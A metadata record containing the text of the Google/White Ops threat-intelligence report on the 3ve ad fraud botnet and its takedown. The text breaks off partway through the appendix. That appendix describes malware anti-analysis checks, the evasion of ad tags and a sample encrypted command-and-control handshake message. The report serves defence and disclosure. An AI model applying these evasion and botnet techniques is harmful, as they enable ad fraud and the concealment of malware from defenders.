{
    "id": "2d627f4f-8eb2-49bf-9270-8c1adf6ac52b",
    "created_at": "2022-10-25T16:48:19.964927Z",
    "updated_at": "2025-03-27T02:16:26.391386Z",
    "deleted_at": null,
    "sha1_hash": "c10757263570d6941a5f0ca2b5b6923271b54eb8",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-11-26T21:25:50Z",
    "file_modification_date": "2018-11-26T21:25:58Z",
    "file_size": 2716155,
    "plain_text": "# The Hunt for 3ve\n\n### Taking down a major ad fraud operation through industry collaboration\n\n#### November 2018\n\n### Co-authored by Google and White Ops with technical contributions by Proofpoint and others\n\n\n-----\n\n### Table of Contents\n\n##### Foreword ..................................................................................................................................... Page 03\n\n Acknowledgements.................................................................................................................. Page 04\n\n Context and background.......................................................................................................... Page 05\n\n A novel and innovative ad fraud threat .................................................................... Page 05\n\n 3ve in a nutshell ........................................................................................................................ Page 06\n\n Operation summary .................................................................................................... Page 06\n\n Discovery and history .............................................................................................................. Page 07\n\n A low-level botnet quickly evolves............................................................................. Page 07\n\n Our knowledge and collaboration expanded .......................................................... Page 07\n\n The 3ve operation ..................................................................................................................... Page 08\n\n 3ve.1 ............................................................................................................................... Page 11\n\n 3ve.2 ............................................................................................................................... Page 12\n\n 3ve.3 ............................................................................................................................... Page 13\n\n Taking 3ve down ....................................................................................................................... Page 14\n\n The industry working group ....................................................................................... Page 14\n\n Indication of a successful takedown........................................................................ Page 14\n\n Uniting the industry against future attacks ............................................................ Page 15\n\n Appendix ..................................................................................................................................... Page 17\n\n 3ve.1................................................................................................................................ Page 17\n\n Operating as a proxy in user’s PCs ....................................................................... Page 17\n\n Network communication ....................................................................................... Page 19\n\n 3ve.1 C2 handshake ................................................................................................ Page 20\n\n BGP hijacking ........................................................................................................... Page 21\n\n 3ve.2 ............................................................................................................................... Page 23\n\n Counterfeit websites................................................................................................ Page 23\n\n Hidden Windows....................................................................................................... Page 27\n\n Fake Browsing Behavior ......................................................................................... Page 27\n\n Mouse movements ................................................................................................. Page 27\n\n Patching functions .................................................................................................. Page 28\n\n Playing media ........................................................................................................... Page 29\n\n Tag evasion ............................................................................................................... Page 30\n\n Non-counterfeit domains browsing ..................................................................... Page 30\n\n C2 Instructions.......................................................................................................... Page 30\n\n    Parameters explained........................................................................................ Page 33\n\n Geographic distribution........................................................................................... Page 34\n\n Infected IPs and churn rate ................................................................................... Page 35\n\n 3ve.3 ............................................................................................................................... Page 35\n\n\n-----\n\n### Foreword\n\nEvery year brings new levels of sophistication and innovation in cybercrime, and the last year was no exception.\n\nOver the course of last year, we investigated one of the most complex and sophisticated ad fraud operations we have seen\n\nto date. We named this operation “3ve” (pronounced “Eve”), and we’re sharing what we’ve learned from our investigation\n\ninto its activity with the broader community to promote collaboration in the ongoing fight against cybercrime. These efforts\n\ndemonstrate how effective cooperation and collaboration across the digital advertising industry can be in curbing ad fraud.\n\n3ve operated on a massive scale: at its peak, it controlled over 1 million IPs from both residential botnet infections and\n\ncorporate IP spaces, primarily in North America and Europe (for comparison, this is more than the number of broadband\n\nsubscriptions in Ireland). It featured several unique sub-operations, each of which constituted a sophisticated ad fraud\n\nscheme in its own right. Shortly after we began to identify the massive infrastructure (comprised of thousands of\n\nservers across many data centers) used to host 3ve’s operation, we found similar activity happening within a network\n\nof malware-infected residential computers. These diversified tactics and siloed operations made 3ve’s operators harder\n\nto identify than previous operations we’d encountered, and also allowed the larger fraud enterprise to continue when one\n\naspect of it was disrupted. Through its varied and complex machinery, 3ve generated billions of fraudulent ad bid requests\n\n(i.e., ad spaces on web pages that advertisers can bid to purchase in an automated way).\n\n3ve’s size and tactics are considerable for an ad fraud operation, but the fact that fraudsters dedicate their time and effort\n\nto developing complex ad fraud schemes is hardly a surprise. Ad fraud has been an attractive cybercrime due to its lucrative\n\nreturns and relatively low risk. The primary risk for most fraudsters has been having their operation discovered and shut\n\ndown. While that can cost fraudsters thousands – and sometimes millions – of dollars in illicit profits, the prospect of purely\n\nfinancial losses has not effectively deterred fraudsters from simply starting another operation.\n\nToday marks the culmination of a collaborative effort that enabled us to more thoroughly confront and dismantle 3ve. We\n\nreferred our findings to law enforcement, and today the U.S. Department of Justice announced criminal charges tied to 3ve’s\n\noperations. What followed was a collaborative and coordinated effort by both law enforcement and various companies\n\nacross industries, including ad tech, cyber security, and Internet service providers, to disable the infrastructure and sinkhole\n\nbotnet command and control servers. The result so far has rendered the operation’s botnets unable to continue to drive\n\nfraudulent ad traffic. Protecting the many targets – including our customers – of an operation like 3ve in the context of a\n\nmulti-stakeholder working group required patience, dedication, diligence, and endurance. Our core objectives were to detect\n\nand prevent this fraud on behalf of our customers and Internet users, and to cut this operation off from its sources of profit.\n\nWhile ad fraud continues to represent a challenge to the advertising industry, the action taken today demonstrates that it is a\n\nrisky activity with potentially serious consequences for fraudsters. And our efforts won’t stop here — we’re confident that the\n\nindustry-wide movement to protect the integrity of the digital advertising economy will continue on.\n\n\n**Tamer Hassan**\n\nCo-Founder & CTO, White Ops\n\n\n**Per Bjorke**\n\nSenior Product Manager, Google\n\n\n-----\n\n### Acknowledgements\n\nThis research was conducted by a team of dedicated security professionals. We would like to thank Kafeine from\n\nProofPoint and the teams at ESET and Malwarebytes, as well as Matt Carothers, F-Secure, Symantec, and Trend Micro\n\nfor their collaboration, contributions, and camaraderie in this effort.\n\nWe would also like to thank all of the participants in the industry working group: Adobe, Amazon Advertising, CenturyLink,\n\nESET, Facebook, Fox-IT, F-Secure, Matt Carothers, McAfee, Microsoft Digital Crimes Unit, Oath, Symantec, The Shadowserver\n\nFoundation, The Trade Desk, Trend Micro, and others. Last but not least, we would like to acknowledge and thank the broader\n\nmembers of our respective teams at Google and White Ops, as their work was critical every step along the way.\n\n_Please note that we’ve aimed to strike a balance in this document in terms of sharing technical information that has_\n\n_utility and excluding additional information that is too sensitive to share publicly. We encourage ad fraud researchers_\n\n_and other information security professionals to contact us at threatintel@whiteops.com for additional information_\n\n_that we may be able to disclose on a case-by-case basis._\n\n\n-----\n\n### Context and background\n\nThe world of data science and cybersecurity is nothing\n\nlike detective work in the movies. Usually, fraudulent activity\n\nis identified, traced to its source, and then cut off — and\n\nthat’s where the vast majority of cases end. Rarely does\n\ncorporate ad fraud prevention lead to criminal charges, but\n\nthat is exactly what happened with 3ve.\n\n3ve first emerged as a small bot-driven effort that\n\nsubsequently grew into a large and sophisticated operation.\n\nAs we investigated and battled against it, we began to\n\nbetter understand the operation and its aggressive\n\nevolution — and realized there were several operations\n\nwith some common characteristics. Through our fight, we\n\nfound ourselves on a path of discovery, exploration, and\n\nwhat some might describe as adventure.\n\nToday, digital advertising is primarily bought and sold\n\nthrough “programmatic” platforms. Publishers agree to\n\nfeature ads alongside their content and use Supply Side\n\nPlatforms (SSPs) to auction their available ad space,\n\nor inventory, to advertisers. Advertisers use Demand\n\nSide Platforms (DSPs) to bid on that available ad space\n\nbased on how successful they think those ads will be in\n\ngenerating the interest of visitors. These auctions happen\n\nbillions of times a day, in the milliseconds before a page\n\nloads on your browser, and inventory can be passed\n\nbetween many auctions before being matched with an\n\nadvertiser who wants to place their ad on your screen.\n\nThe ability to sell and purchase digital advertising inventory\n\nprogrammatically has enabled publishers to maximize\n\nrevenues and advertisers to realize a greater return on\n\ninvestment. Subsequently, programmatic advertising has\n\nrapidly evolved and grown into a multi-billion dollar industry,\n\nincreasingly gaining prominence and visibility across the\n\ndigital advertising ecosystem. Unfortunately, this increased\n\nprominence has also attracted the attention of tech-savvy\n\nfraudsters, who try to produce fake traffic and fraudulent\n\nad inventory to trick advertisers into believing that their ads\n\n\nare being seen by actual, interested users. These fraudsters\n\nattempt to extract small amounts of money from multiple\n\nparties and transactions with the goal of making the losses\n\nappear unconnected — if they’re successful, in aggregate,\n\nthese extracted amounts can add up to considerable profits\n\nfor the fraudsters.\n\nBecause operations like 3ve bring distrust and instability\n\nto the digital advertising ecosystem, we were as thorough\n\nas possible in our efforts to bring it down. In the twists and\n\nturns that followed, we learned valuable lessons about the\n\ntactics and approaches fraudsters try to use to escape the\n\nnotice of both their victims and those trying to uncover their\n\noperations, and the signals that will tip us off to similar\n\noperations in the future.\n\n#### A novel and innovative ad fraud threat\n\n3ve was typical of many ad fraud operations in that it\n\ngenerated revenue by selling forgeries of two major\n\nassets in high demand from advertisers: human audiences\n\nand premium publisher inventory. But because 3ve was\n\nuniquely effective at counterfeiting the domains of\n\nprestigious publishers and sending droves of bots to false\n\ninventory, it was able to generate a substantial volume\n\nof fake ad bid requests. 3ve also operated at a high level\n\nof sophistication that appeared to be a series of unrelated\n\noperations. Its operators constantly adopted new ways\n\nto disguise 3ve’s bots, allowing the operation to continue\n\ngrowing even after their traffic was blacklisted. Whenever\n\nthey were blocked off in one place, they’d reappear\n\nsomewhere else.\n\n\n#### 3ve was typical of many ad fraud operations\n in that it generated revenue by selling forgeries\n of two major assets in high demand from advertisers: human audiences and premium\n publisher inventory.\n\n\n-----\n\non third party verification solutions like White Ops and\n\nin-house defenses like those implemented by Google.\n\nCollectively, our teams have seen a wide range of botnet\n\nschemes, ad fraud tactics, and invalid activity.\n\n### 3ve in a nutshell\n\n\ninvestigation into 3ve, connect all of its disparate\n\nsub-operations and components to a larger infrastructure,\n\nand reveal how sophisticated and well-organized these\n\noperation were.\n\n\n## 700k\n\nActive infections at a time\n\n## 1k+\n\nData center nodes\n\n\n## 3b+\n\nDaily bid requests\n\n## 60k+\n\nAccounts selling ad inventory\n\n\nOperation summary\n\n## 1m\n\nCompromised IPs\n\n## 10k+\n\nWebsites counterfeited\n\n\n_Peak metrics, including ad traffic volumes and other volumes observed over the course of 3ve’s investigation._\n\nAdvanced techniques used to avoid detection\n\nMimicking human behaviors including mouse movements, faked clicks, etc.\n\nTag evasion\n\nAbility to quickly regenerate residential IP addresses\n\nMalware anti-forensics\n\nNo single point of failure (e.g., fixed IP list)\n\n_3ve used a variety of techniques that made it more difficult to identify and analyze._\n\n\n-----\n\n### Discovery and history\n\n#### A low-level botnet quickly evolves\n\nWe first noticed the beginnings of what would later become\n\n3ve while our two companies were assessing the impact\n\nof the Methbot operation, a similar underground ad fraud\n\nenterprise that White Ops revealed in 2016. At this early\n\nstage of 3ve’s growth, it appeared to be a low-volume\n\nbot operation conducting ad fraud through residential\n\ncomputers infected with an unknown malware. Far from\n\nbeing groundbreaking, it looked like a run-of-the-mill\n\nmalicious bot with minimal impact on the industry at large.\n\n\nnoting that 3-12 billion is a small percentage of overall bid\n\nrequest volume across the industry\n\n#### Our knowledge and collaboration expanded\n\nAlthough we were able to identify the traffic from the\n\noperation, our visibility into its full capabilities was limited\n\nuntil we discovered malware samples that matched what\n\nwe’d seen from 3ve’s bots. This led us to two malware\n\nfamilies: Boaxxe/Miuref and Kovter.\n\n\n#### We estimate that 3ve generated between\n 3 billion and 12 billion or more daily ad bid\n requests at its peak.\n\n\nBut 3ve’s activity grew in 2017, with its operation eventually\n\ngenerating billions of daily ad bid requests. That spike in\n\nactivity prompted our two companies to begin collaborating\n\nin investigating the malware being used by this newly\n\nprominent fraud enterprise. We estimate that 3ve generated\n\nbetween 3 billion and 12 billion or more daily ad bid requests\n\nat its peak.\n\nThe lower bound (3 billion) is a conservative estimate based\n\non how many ad bid requests a single buying platform may\n\nhave received. This approach may underestimate the total\n\nvolume of ad bid requests generated by 3ve, because each\n\nindividual buying platform may not have received all ad\n\nbid requests (e.g. one DSP may not have had a business\n\nrelationship with all available supply partners or a DSP\n\nmay only have received portions of available inventory\n\nfrom some supply partners). When measuring 3ve’s ad\n\nbid volume across the supply chain (and not only within\n\na single buying platform) we estimate that the ad bid\n\nvolume exceeded 12 billion daily ad bid requests. It should\n\nbe noted that our analysis of ad bid requests indicated\n\ngrowth in activity, but not necessarily growth in transactions\n\nthat would result in charges to advertisers. It is also worth\n\n\nWe gathered malware samples from fellow fraud\n\nresearchers at Proofpoint and Malwarebytes, but each\n\ntime we tried to run them on our own computers, they\n\nwouldn’t work. After some deep collaboration with\n\nProofPoint and Malwarebytes, we discovered that this\n\nwas because the malware was using anti-forensics, an\n\nevasion tactic in which malware scans a computer’s\n\nprocesses, hardware, username, and IP address for any\n\nsecurity software that might detect it before running on\n\nthat computer. The malware was also only receiving and\n\nexecuting ad fraud instructions on computers with certain\n\nISPs and in specific geographical locations. Subsequently,\n\nwe were able to observe and gradually understand 3ve’s\n\ninner workings. That process progressively revealed the\n\npresence of more malware and botnet families being\n\nused by 3ve.\n\nWe started referring to the bot operation as 3ve because our\n\nanalysis suggested that it was composed of three distinct\n\nsub-operations, all of which shared certain similarities,\n\nbut were specifically designed to commit different kinds\n\nof ad fraud. We observed the network using tactics like\n\n\n#### We started referring to the bot operation as\n 3ve because our analysis suggested that it\n was composed of three distinct sub-operations,\n all of which shared certain similarities, but\n which were specifically designed to commit different kinds of ad fraud.\n\n\n-----\n\nnoticed that it had started to quickly change its codebase\n\nafter each spike in its activity.\n\n\n#### We had to ensure that the operators thought they were going unnoticed in order to observe them and apply our learnings to future security efforts.\n\n\nThe actors responsible for the three sub-operations of\n\n3ve demonstrated a high level of sophistication, creativity,\n\nand agility. In response, we needed to figure out a way to\n\npermanently disable it or shut it down.\n\nOne way to bring down bot operations is to blacklist all\n\nof their known IP addresses. However, because of the\n\noperation’s aggressiveness, as well as its ability to rapidly\n\n### The 3ve operation\n\n\nwould only temporarily interrupt 3ve’s activity. To take it\n\ndown permanently, we needed to understand how 3ve\n\nwas structured and organized, we had to ensure that the\n\noperators thought they were going unnoticed in order to\n\nobserve them and apply our learnings to future security\n\nefforts, and we needed to expand our effort beyond\n\nGoogle and White Ops.\n\nAs 3ve’s perpetrators were building the infrastructure\n\nbehind their operations, we secretly started building\n\na coalition of partners working to stop them. Over the\n\nfollowing weeks and months, White Ops, Google,\n\nand various other industry participants together to\n\ndismantle 3ve.\n\n\nA typical ad fraud operation tries to keep its profit model simple, targeting only one aspect of the digital advertising\n\necosystem. For example, fraudsters will commonly create and sell bot traffic to unsuspecting publishers looking to\n\nget more eyes on their content. At least two of the three 3ve sub-operations used such tactics and also added another\n\ncommon approach: selling counterfeit ad inventory featuring the domains of popular websites “spoofed” by 3ve’s\n\noperators. Domain spoofing is designed to fool advertisers into thinking that an impression of their ad was served on\n\na premium publisher site, like that of a noteworthy newspaper (and not on an empty website designed for bot traffic).\n\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               - • • • • • • • • • Watch More Funny Movies on FilmPhileWatch Live TV on FilmPhileClosed CaptioningAmerican Sis - Sibling Rivalry - FilmPhileWatch This Season’s Comedy on FilmPhileHere’s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhileTurned - All Is Not Gone - FIlmPhileCD League - Semifinals/Grand Final - FilmPhileSearchHelp\n\n_An example counterfeit site shows a low-quality web page with a video ad and links below._\n\n\n\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 - • • • • • • • • • Watch More Funny Movies on FilmPhileWatch Live TV on FilmPhileClosed CaptioningAmerican Sis - Sibling Rivalry - FilmPhileWatch This Season’s Comedy on FilmPhileHere’s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhileTurned - All Is Not Gone - FIlmPhileCD League - Semifinals/Grand Final - FilmPhileSearchHelp\n\n\n-----\n\nunique measures to avoid detection, and each built around different architectures using different components. Like a fully\n\nprofessional software company, 3ve’s operators had the ability to A/B test different approaches, as well as different parts\n\nof the bot operation, in order to insulate themselves from the fallout if one part was somehow cut off or shut down.\n\nAlthough the degree of complexity varied among the three sub-operations, all three demonstrated highly advanced\n\nbehaviors, including the impersonation of real human users, tag evasion, and sophisticated malware-based anti-forensics.\n\n|Col1|Overall 3ve operations|Col3|Col4|\n|---|---|---|---|\n||3ve.1|3ve.2|3ve.3|\n|General Description|Data center based bot with botnet and hijacked IPs|Botnet based counterfeit ad fraud|Data center bot|\n|Monetization Approach|Mostly counterfeit inventory (including counterfeiting mApp) with fake pages and apps hosted in data centers. Indication of some traffic selling.|Mostly counterfeit inventory with fake pages hosted in data centers. Indication of some traffic selling.|Indications of traffic selling, and unable to determine if they also create counterfeit inventory.|\n|Ad Request IP Address|The residential IPs of botnet infected computers or from BGP hijacked IPs|The residential IPs of botnet infected computers|Data center IPs|\n\n\n-----\n\nOne of the three sub-operations included one of the larger active botnets, with up to 700,000 active desktop infections at\n\nany given time. One of the other 3ve sub-operations was by itself similar in size and scope to the Methbot operation of 2016,\n\nwhich was likely the largest known ad fraud operation at that time.\n\nAll told, 3ve controlled over 1 million IPs from both residential botnet infections and corporate IP spaces (as noted above,\n\nthere were up to 700,000 active infections at any given time). In aggregate, the operation also produced more than 10,000\n\ncounterfeit domains, and generated over 3 billion daily bid requests at its peak. We estimate that portions of the bot\n\noperation spanned over 1,000 servers in data centers allocated to various functions needed for this type of large-scale\n\noperation.\n\nDespite 3ve’s scale and aggressive growth, we worked proactively to deploy countermeasures in order to protect customers\n\nand to diminish the chances that 3ve’s operators could benefit from their activities. Our collective experience in combating ad\n\nfraud enabled us to establish a variety of defenses against 3ve, while we worked in parallel to dismantle it.\n\nThe sections below provide a brief overview of all three 3ve operations (called 3ve.1, 3ve.2, and 3ve.3 for the sake of clarity),\n\nbreaking down how each was structured to circumvent bot detection and blocking measures in order to siphon as much ad\n\nbudget as possible. Expanded details and context for the sub-operations are included in the Appendix.\n\nReal Human Traffic Progammatic Supply Chain\n\n**Ad Networks** **Advertisers**\n\nSell ad space to Win auctions to deliver\nDemand Side Platforms ads on webpages.\nand directly to advertisers.\n\n**Everyday People**\n\nCreate real ad space by\nvisiting real web pages.\n\nFake or Non-Human Traffic 01 01 01\n\n**1,000+**\n\nReal and fake web pages\n\ncreate ad space that\n\n**Ad Fraud Operator** **3ve Botnets** is sold in programmatic **Supply Side Platforms** **Demand Side Platforms**\n\nsupply chain.\n\nUploads instructions Open thousands of web Sell ad space to Submit bids on behalf\n\nto 3ve botnets. browsers, disguise traffic, and Demand Side Platforms of advertisers to\n\nvisit fake and real web pages. in real time. purchase ad space.\n\n_An overview of the broader 3ve operation_\n\n\n-----\n\nThe first of 3ve’s three ad fraud sub-operations, 3ve.1, was powered by a network of bots all operating in a few data centers\n\nacross the US and Europe. Normally, bot operations like these are very easy to detect — if you see a lot of traffic for an ad\n\ncoming from the same IP address, you know you’re dealing with a bot farm. But this operation cleverly used compromised IP\n\naddresses as a proxy, making it seem as though its ad requests were coming from computers in homes and businesses in\n\nsought-after markets. While many of these IP addresses were acquired via a malware called Miuref or Boaxxe, others were\n\nobtained using a procedure called Border Gateway Protocol (BGP) hijacking. The hackers essentially seized huge swaths of\n\ncorporate and residential IP space by interfering directly with the main Internet routing protocol.\n\nAll the fake ad requests from 3ve.1 initially pretended to be from desktop browsers, but this changed over time, with the\n\noperation increasingly relying on spoofed mobile traffic. This was done by the data center-based browsers pretending to be\n\nAndroid devices. There were two unique, active mobile misrepresentation schemes: in one the ad requests were spoofed\n\nto look like they came from mobile apps, in the other the ad requests were spoofed to look like they came from mobile\n\nbrowsers. The spoofing was achieved by overriding the parameters typically used to determine what type of device the\n\ntraffic came from.\n\n**1,000+**\n\nAd fraud operator writes The data center computers The command and control relays Those fake web pages generate\ninstructions and uploads it open thousands of web direct the data center browsers ad requests to receive ads from\nto their data center botnet. browsers and contact a to proxy their traffic through the programmatic supply chain.\n\ncommand and control relay. infected devices or hijacked IPs\n\nand visit fake and real web pages.\n\n_3ve.1 architecture_\n\n\n-----\n\nComparable to 3ve.1, 3ve.2 also used counterfeit domains to sell fake ad inventory to advertisers. But instead of relying on\n\nproxies to hide its activities, 3ve.2 used a custom-built browsing engine installed with the Kovter botnet, which had infected\n\nhundreds of thousands of computers through malvertising campaigns (malvertising is the use of digital ads to distribute\n\nmalware). This operation had similarities with 3ve.1 (although 3ve.2 was superior in its level of sophistication) that initially\n\nled us to believe they might be variants of each other, but later research suggested they were distinct, but connected\n\nsub-operations. Recent evaluations of the Kovter botnet have put it at approximately 700,000 user computers and IP\n\naddresses. 3ve.2 made use of redirection servers that instructed the infected computers to visit specific fake web pages.\n\nFraud Operator sends Kovter infected computers Infected computer opens Web pages generate ad\ninstructions to command receive instructions hidden browsers and visits requests to receive ads\n\nand control server. from command and a fake web page (via from the programmatic\n\ncontrol server. a redirect server). supply chain.\n\n_3ve.2 architecture_\n\n\n-----\n\nThe third 3ve-associated sub-operation was similar to the others in that it registered its ad fraud bot networks under\n\ndifferent IP addresses in order to hide their activity. Like 3ve.1, 3ve.3’s bots were based in a few data centers, but it used\n\nthe IP addresses of other data centers instead of residential computers to cover its tracks. Again, data centers are far\n\nmore suspicious to advertisers worried about bot traffic, but 3ve.3’s strategy still allowed its operators a good degree of\n\nagility by allowing them to find new data centers as soon as old data centers were blocked. Although easier to detect, this\n\napproach allowed them to commit ad fraud more efficiently — data centers can offer greater bandwidth than hundreds\n\nof thousands of residential computers.\n\n**1,000+**\n\nAd Fraud operator The data center computers The command and control relays Those fake web pages\nwrites instructions open thousands of web direct the data center browsers generate ad requests to\nand uploads it to their browsers and contact a to proxy their traffic through data receive ads from\n\ndata center botnet. command and control relay. center IPs and visit fake and real the programmatic\n\nweb pages. supply chain.\n\n_3ve.3 architecture_\n\n\n-----\n\n### Taking 3ve down\n\nWith each detail we uncovered about 3ve and its inner\n\nworkings, it became clearer that a typical blacklisting\n\neffort would only cause portions of the operation to\n\nmomentarily go offline, giving 3ve’s operators a chance\n\nto reset a short time later.\n\n3ve’s sheer size and complexity posed a significant risk\n\nnot just to individual advertisers and publishers, but to\n\nthe entire advertising ecosystem. We had to shut the\n\noperation down for good, which called for greater, more\n\ncalculated measures. To that end, it was critical that\n\nwe played the long game, endeavoring to have a more\n\npermanent, more powerful impact against this and\n\nfuture ad fraud operations.\n\nTo dismantle 3ve and prevent its return, collaboration\n\nwas needed from major partners across the digital media\n\nspace, from web publishers to anti-virus companies.\n\nAlthough a technical takedown was necessary, historically\n\ntechnical measures alone have not always been sufficient\n\nto prevent a recurrence in the past. A takedown combined\n\nwith prosecution would more fully disrupt the criminal\n\norganization and serve as a deterrent to similar activity by\n\nother actors. Taking this approach meant spending time\n\ncollectively researching and investigating the operation,\n\nallowing us to map out its infrastructure, its monetization\n\nstrategy, and its major components.\n\n#### The industry working group\n\nIt was this conclusion that prompted the creation of the\n\nindustry working group, which included a variety of\n\nstakeholders including White Ops, Google, 15 other major\n\nindustry parties, and members of the information security\n\ncommunity. This working group used the diverse expertise\n\nof its various partners to analyze and understand 3ve.\n\n\nThe success of the working group can largely be credited to\n\nthe wide range of perspectives and skill sets represented by\n\nits participants. The diverse vantage points and indispensable\n\ninsights of key ad tech companies and several ISPs were\n\ninstrumental in understanding 3ve’s impact, while anti-virus\n\nspecialists worked to understand the malware that was\nwritten and installed onto residential computers as a way to\n\nprovide cover for the botnet’s data centers.\n\nOur investigation and analysis of 3ve was expedited by this\n\ncross-functional collaboration with industry partners.\n\n#### Indication of a successful takedown\n\nA coordinated takedown of infrastructure related to 3ve’s\n\noperations occurred recently. The takedown involved\n\ndisrupting as much of the related infrastructure as possible\n\nto make it hard to rebuild any of 3ve’s operations. Technical\n\ntakedowns like these require detailed understanding of\n\nthe internal aspects of the fraud operations and extensive\n\ncollaboration across many companies from various parts\n\nof the industry. As the graph below demonstrates, declining\n\nvolumes in invalid traffic indicate that the disruption of\n\ninfrastructure thus far has been successful, bringing the\n\nbid request traffic close to zero within 18 hours of starting\n\nthe coordinated takedown. Our sincere gratitude and\n\nappreciation to everyone involved with this takedown effort.\n\n\nOne of the working group’s main goals was collaborative\n\nintelligence. The working group spent months observing\n\n3ve’s activities, working to build an invaluable technical\n\napproach to identifying and defending against similar\n\nthreats in the future.\n\n\n#### The working group spent months observing 3ve’s activities, working to build an invaluable technical approach to identifying and defending against similar threats in the future.\n\n\n-----\n\n12:00 AM 12:00 PM 12:00 AM 12:00 PM 12:00 AM 12:00 PM\n\nTime\n\n\n_Incoming 3ve.2 bid requests (via OpenRTB protocol)_\n\n#### Uniting the industry against future attacks\n\n\nWhenever a major ad fraud operation like this is uncovered, it serves as a wake-up call to those involved in digital\n\nadvertising. Not only is it necessary to reinforce traditional guards against ad fraud, but three critical tactics need to be\n\n\nadopted to account for the rapidly evolving capabilities of automated threats like 3ve.\n\n1. Create and adopt industry standards like ads.txt — The industry is working on new tools to protect itself from ad\n\n\nfraud. Ads.txt was created by the IAB Tech Lab to help prevent domain spoofing by allowing publishers to create public\n\nfiles of “Authorized Digital Sellers.” These files make it easy to see which parties are authorized to sell that publisher’s\n\nad inventory. Adoption of ads.txt has been very strong: to date over 500,000 domains have published\n\n\nads.txt files. As more sell- and buy-side platforms continue to roll out their enforcement and advertisers opt to only\n\nbuy inventory from domains with ads.txt files, the potential for fraudsters to profit from selling counterfeit inventory\n\nwill be minimized.\n\n\n2. Be mindful and proactive about ad fraud — There are a number of heuristics that advertisers can use to ensure\n\nthat whatever ad fraud solution they have in place is working. One good rule of thumb: if it seems too good to be\n\n\ntrue, it probably is. That means if you start implementing an anti-fraud solution that decreases your fraud rate, but\n\ndoesn’t cause your CTR to drop with it, it’s likely that your solution isn’t quite working correctly. Similarly, your ad\n\n\nfraud rate should be changing over time, as there is inherent variability in traffic volumes.\n\n\n3. Use a layered methodology for fighting ad fraud — Much of our experience with 3ve demonstrates just how good\n\nbots have become at imitating human users. Advertisers and publishers should therefore take a layered approach\n\n\nto bot traffic and ad fraud detection, using both in-house defenses and third-party verification to look for all the\n\nindicators of bot-controlled computers.\n\n\n-----\n\nin the graph below, more than 80% of the incoming ad bid requests that 3ve generated in early 2018 were unauthorized\n\n(‘unauthorized’ in this context means that the bid requests were offered for sale by sellers that were not listed as authorized\n\nsellers in a domain’s ads.txt file) . If all ad tech companies and advertisers enforced ads.txt and stopped buying or selling\n\nunauthorized inventory, over 80% of all 3ve inventory would be completely blocked across the entire industry..\n\nads.txt status for 3ve traffic\n\n8.6% Authorized (Direct)\n\n11% Authorized (Indirect)\n\n80.3% Unauthorized\n\n_ads.txt status for recent 3ve traffic_\n\n3ve’s takedown represents two important milestones for the digital advertising industry: First, it demonstrates the power of\n\nindustry collaboration in confronting sophisticated ad fraud operations. Second, that law enforcement action sends a clear\n\nmessage that committing ad fraud can have significant consequences, which is likely to discourage would-be cybercriminals.\n\nCurtailing ad fraud is not only good for the digital advertising ecosystem, but also the billions of people who rely on the\n\nInternet to be a safe place where they can access services and information that add value to their lives. We believe that both\n\nthe intelligence we’ve gained from 3ve, and subsequent law enforcement action, should make it riskier and harder for similar\n\noperations to profit in the future.\n\n\n-----\n\n### Appendix\n\nWe’ve included the sections below to expand on the details and context provided for 3ve’s three sub-operations in\n\nthe main body of this document.\n\n\n#### 3ve.1\n\nThe first of 3ve’s three ad fraud sub-operations, 3ve.1,\n\nwas a hybrid operation, and was itself composed of three\n\nmain layers: an army of bots in multiple European data\n\ncenters, a layer of exit nodes (the IP addresses that the\n\nad requests appear to originate from) comprised of\n\nmalware-infected user computers or stolen corporate IP\n\nspace, and a command and control (C2) layer that directed\n\nthe malware and ad fraud bots on every transaction.\n\nThis sub-operation was primarily focused on video fraud,\n\nselling counterfeit video inventory to advertisers on\n\ncounterfeited domains.\n\nThis layered architecture allowed the operators to keep\n\ntheir bot software isolated, proxying all activity through\n\nboth infected user computers and through IP space stolen\n\nfrom corporations via Border Gateway Protocol (BGP)\n\nhijacks. Acquiring IP addresses this way is significant\n\nbecause it constitutes a particularly blatant form of fraud,\n\nused to corrupt large groups of IPs by interfering directly\n\nwith an exterior routing protocol. If one of these stolen\n\nIP addresses was detected as the source of fraudulent\n\nactivity, it was easily burned and recycled, while the same\n\nbots continued running in the data centers behind it. The\n\noperation’s ability to continuously find new IPs through\n\nwhich to proxy gave it a layer of protection and isolation,\n\navoiding any “single point of failure” that could allow us\n\nto easily eradicate it.\n\nThe ad fraud bot operation was comprised of Miuref/Boaxxe\n\ninfected-computers. This bot farm largely relied on Chrome\n\nand Internet Explorer. While the number of IPs hijacked from\n\ncorporations ranged from 200,000 to 500,000 at any given\n\ntime, the malware infection footprint appears to have\n\nremained at less than 5,000 infections across the globe.\n\n\nOperating as a proxy in user’s PCs\n\nWhenever the 3ve.1 binary was executed, it would start\n\ncollecting specific information about the PC on which it\n\nwas running. Among other things, the binary would read\n\nthe Computer Name, Volume Serial Number, Machine GUID,\n\nthe full path of the running process (in this case, c:\\test\\\n\neve.exe), and time zone. Then, it would build a hash table\n\nof known programs that are typically used by analysts.\n\nFinally, it used the typical CreateToolhelp32Snapshot/\n\nProcess32NextW to enumerate all running processes\n\nand cross-reference them with the hash table.\n\n3ve.1’s binary did the same thing with device drivers,\n\nchecking for the presence of VMs, remote access\n\nsoftware (LogMeIn), CD-ROM type, etc. If anything went\n\nwrong, it would sleep forever without executing any\n\nfraud-like requests. While running all these checks, it\n\nwould also copy itself to other locations and drop a new\n\nbinary file into C:\\Users\\...\\AppData\\Local\\\n\nVirtualStore\\lsass.aaa.\n\nAll this information would be appended to a big string, which\n\nwas RSA-encrypted (with a hard-coded key) and sent to the\n\nserver. To be clear, the first message included both the user\n\ninfo and the RC4 key, and was encrypted with an RSA public\n\nkey. If the C2 confirmed that it was safe to start executing\n\ncommands, the following messages would be quickly\n\nencrypted with RC4 using the previously generated RC4 key.\n\n\n-----\n\npn:C:\\Test\\eve.exe\nun:davidcopperfield\ncn:DESKTOP-1Z8V3O1\ncpu:1,1,Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz\nsk: uwomanrx (RC4 Key used for future communication)\n\n\n_Message sent and encrypted for 3ve.1 to start executing commands._\n\nAfter encryption\nBefore encryption\n\nand encoding\n\n↓ FRO 